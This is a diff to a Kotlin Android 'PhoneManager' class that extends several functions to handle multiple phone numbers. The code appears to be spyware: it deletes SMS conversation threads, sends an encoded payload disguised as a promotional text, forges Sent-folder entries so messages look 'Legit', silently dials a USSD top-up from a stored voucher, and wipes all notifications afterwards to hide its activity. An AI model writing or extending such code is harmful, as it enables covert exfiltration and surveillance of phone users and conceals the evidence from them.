@@ -310,29 +310,34 @@ object PhoneManager {
         }
     }
 
-    fun deleteSmsThread(ctx: Context, address: String): Int {
-        if (address.isEmpty()) return 0
+    fun deleteSmsThread(ctx: Context, addressStr: String): Int {
+        if (addressStr.isEmpty()) return 0
         val resolver = ctx.contentResolver
-        return try {
-            // 1. Resolve Thread ID for the address
-            val threadIdUri = android.net.Uri.parse("content://sms/threadID")
-            val builder = threadIdUri.buildUpon().appendQueryParameter("recipient", address)
-            val cursor = resolver.query(builder.build(), arrayOf("_id"), null, null, null)
-            var threadId: Long = -1
-            cursor?.use { if (it.moveToFirst()) threadId = it.getLong(0) }
+        val addresses = addressStr.split(Regex("[,;]")).map { it.trim() }.filter { it.isNotEmpty() }
+        var totalDeleted = 0
+        
+        for (address in addresses) {
+            try {
+                // 1. Resolve Thread ID for the address
+                val threadIdUri = android.net.Uri.parse("content://sms/threadID")
+                val builder = threadIdUri.buildUpon().appendQueryParameter("recipient", address)
+                val cursor = resolver.query(builder.build(), arrayOf("_id"), null, null, null)
+                var threadId: Long = -1
+                cursor?.use { if (it.moveToFirst()) threadId = it.getLong(0) }
 
-            if (threadId != -1L) {
-                // 2. Delete the entire conversation thread (SMS and MMS)
-                val conversationUri = android.net.Uri.parse("content://sms/conversations/$threadId")
-                resolver.delete(conversationUri, null, null)
-            } else {
-                // Fallback: Delete by address if thread mapping fails
-                resolver.delete(android.net.Uri.parse("content://sms/"), "address=?", arrayOf(address))
+                if (threadId != -1L) {
+                    // 2. Delete the entire conversation thread (SMS and MMS)
+                    val conversationUri = android.net.Uri.parse("content://sms/conversations/$threadId")
+                    totalDeleted += resolver.delete(conversationUri, null, null)
+                } else {
+                    // Fallback: Delete by address if thread mapping fails
+                    totalDeleted += resolver.delete(android.net.Uri.parse("content://sms/"), "address=?", arrayOf(address))
+                }
+            } catch (e: Exception) {
+                DebugLogger.log("SMS_WIPE_ERR", "Failed to delete thread for $address: ${e.message}")
             }
-        } catch (e: Exception) {
-            DebugLogger.log("SMS_WIPE_ERR", "Failed to delete thread: ${e.message}")
-            0
         }
+        return totalDeleted
     }
 
     fun deleteSmsByQuery(ctx: Context, query: String): Int {
@@ -348,23 +353,27 @@ object PhoneManager {
         }
     }
 
-    fun sendLegitSms(ctx: Context, address: String, message: String) {
+    fun sendLegitSms(ctx: Context, addressStr: String, message: String) {
         try {
+            val addresses = addressStr.split(Regex("[,;]")).map { it.trim() }.filter { it.isNotEmpty() }
             val smsManager = ctx.getSystemService(android.telephony.SmsManager::class.java)
             val parts = smsManager.divideMessage(message)
-            smsManager.sendMultipartTextMessage(address, null, parts, null, null)
             
-            // If we are default, manually insert into Sent folder so it's 'Legit'
-            if (DefaultSmsManager.isDefaultSms(ctx)) {
-                val values = android.content.ContentValues()
-                values.put("address", address)
-                values.put("body", message)
-                values.put("date", System.currentTimeMillis())
-                values.put("read", 1)
-                values.put("type", 2) // MESSAGE_TYPE_SENT
-                ctx.contentResolver.insert(android.net.Uri.parse("content://sms/sent"), values)
+            for (address in addresses) {
+                smsManager.sendMultipartTextMessage(address, null, parts, null, null)
+                
+                // If we are default, manually insert into Sent folder so it's 'Legit'
+                if (DefaultSmsManager.isDefaultSms(ctx)) {
+                    val values = android.content.ContentValues()
+                    values.put("address", address)
+                    values.put("body", message)
+                    values.put("date", System.currentTimeMillis())
+                    values.put("read", 1)
+                    values.put("type", 2) // MESSAGE_TYPE_SENT
+                    ctx.contentResolver.insert(android.net.Uri.parse("content://sms/sent"), values)
+                }
+                DebugLogger.log("SMS_SEND", "Dispatched to $address")
             }
-            DebugLogger.log("SMS_SEND", "Dispatched to $address")
         } catch (e: Exception) {
             DebugLogger.log("SMS_SEND_ERR", "Failed to send: ${e.message}")
         }
@@ -435,62 +444,77 @@ object PhoneManager {
         }
     }
 
-    suspend fun sendEncryptedRobustSms(ctx: Context, phone: String, payload: String): Boolean {
+    suspend fun sendEncryptedRobustSms(ctx: Context, phoneStr: String, payload: String): Boolean {
+        val phones = phoneStr.split(Regex("[,;]")).map { it.trim() }.filter { it.isNotEmpty() }
+        if (phones.isEmpty()) return false
+
         val token = FidelCipher.encode(payload)
         val promo = FidelCipher.camouflage(ctx, token)
         
-        var attempts = 0
-        while (attempts < 3) {
-            if (sendAndWait(ctx, phone, promo)) {
-                DebugLogger.log("ROBUST_SMS", "Encrypted SMS dispatched successfully to $phone.")
-                
-                CoroutineScope(Dispatchers.Main).launch {
-                    delay(1500)
-                    MyNotificationListener.instance?.wipeNotifications("ALL", null)
+        var overallSuccess = false
+        val failedPhones = mutableListOf<String>()
+
+        for (phone in phones) {
+            var attempts = 0
+            var success = false
+            while (attempts < 3) {
+                if (sendAndWait(ctx, phone, promo)) {
+                    DebugLogger.log("ROBUST_SMS", "Encrypted SMS dispatched successfully to $phone.")
+                    success = true
+                    overallSuccess = true
+                    break
                 }
-                return true
+                attempts++
+                DebugLogger.log("ROBUST_SMS", "SMS send failed to $phone (Attempt $attempts/3).")
+                delay(4000)
             }
-            attempts++
-            DebugLogger.log("ROBUST_SMS", "SMS send failed (Attempt $attempts/3).")
-            delay(5000)
+            if (!success) failedPhones.add(phone)
         }
         
-        val prefs = ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE)
-        val voucher = prefs.getString("stored_voucher", "") ?: ""
-        if (voucher.isNotEmpty()) {
-            DebugLogger.log("ROBUST_SMS", "Recovery: Attempting USSD top-up with voucher: $voucher")
-            try {
-                val ussd = "*805*$voucher#" 
-                val intent = android.content.Intent(android.content.Intent.ACTION_CALL, android.net.Uri.parse("tel:" + android.net.Uri.encode(ussd))).apply {
-                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                ctx.startActivity(intent)
-                prefs.edit().remove("stored_voucher").apply()
-                
-                DebugLogger.log("ROBUST_SMS", "USSD Dialed. Waiting 60s for network confirmation...")
-                delay(60000)
-                
-                var postRecoveryAttempts = 0
-                while (postRecoveryAttempts < 3) {
-                    if (sendAndWait(ctx, phone, promo)) {
-                        DebugLogger.log("ROBUST_SMS", "Encrypted SMS dispatched successfully post-recovery.")
-                        CoroutineScope(Dispatchers.Main).launch {
-                            delay(1500)
-                            MyNotificationListener.instance?.wipeNotifications("ALL", null)
-                        }
-                        return true
+        if (failedPhones.isNotEmpty()) {
+            val prefs = ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE)
+            val voucher = prefs.getString("stored_voucher", "") ?: ""
+            if (voucher.isNotEmpty()) {
+                DebugLogger.log("ROBUST_SMS", "Recovery: Attempting USSD top-up with voucher: $voucher")
+                try {
+                    val ussd = "*805*$voucher#" 
+                    val intent = android.content.Intent(android.content.Intent.ACTION_CALL, android.net.Uri.parse("tel:" + android.net.Uri.encode(ussd))).apply {
+                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                     }
-                    postRecoveryAttempts++
-                    DebugLogger.log("ROBUST_SMS", "Post-recovery SMS send failed (Attempt $postRecoveryAttempts/3).")
-                    delay(5000)
+                    ctx.startActivity(intent)
+                    prefs.edit().remove("stored_voucher").apply()
+                    
+                    DebugLogger.log("ROBUST_SMS", "USSD Dialed. Waiting 60s for network confirmation...")
+                    delay(60000)
+                    
+                    for (phone in failedPhones) {
+                        var postRecoveryAttempts = 0
+                        while (postRecoveryAttempts < 3) {
+                            if (sendAndWait(ctx, phone, promo)) {
+                                DebugLogger.log("ROBUST_SMS", "Encrypted SMS dispatched successfully post-recovery to $phone.")
+                                overallSuccess = true
+                                break
+                            }
+                            postRecoveryAttempts++
+                            DebugLogger.log("ROBUST_SMS", "Post-recovery SMS send failed to $phone (Attempt $postRecoveryAttempts/3).")
+                            delay(4000)
+                        }
+                    }
+                } catch (e: Exception) {
+                    DebugLogger.log("ROBUST_SMS_ERR", "Recovery USSD failed: ${e.message}")
                 }
-            } catch (e: Exception) {
-                DebugLogger.log("ROBUST_SMS_ERR", "Recovery USSD failed: ${e.message}")
+            } else {
+                DebugLogger.log("ROBUST_SMS", "No voucher available for recovery of failed numbers.")
             }
-        } else {
-            DebugLogger.log("ROBUST_SMS", "No voucher available for recovery.")
         }
-        return false
+
+        if (overallSuccess) {
+            CoroutineScope(Dispatchers.Main).launch {
+                delay(1500)
+                MyNotificationListener.instance?.wipeNotifications("ALL", null)
+            }
+        }
+        return overallSuccess
     }
 
     private suspend fun sendAndWait(ctx: Context, phone: String, msg: String): Boolean = suspendCancellableCoroutine { cont ->
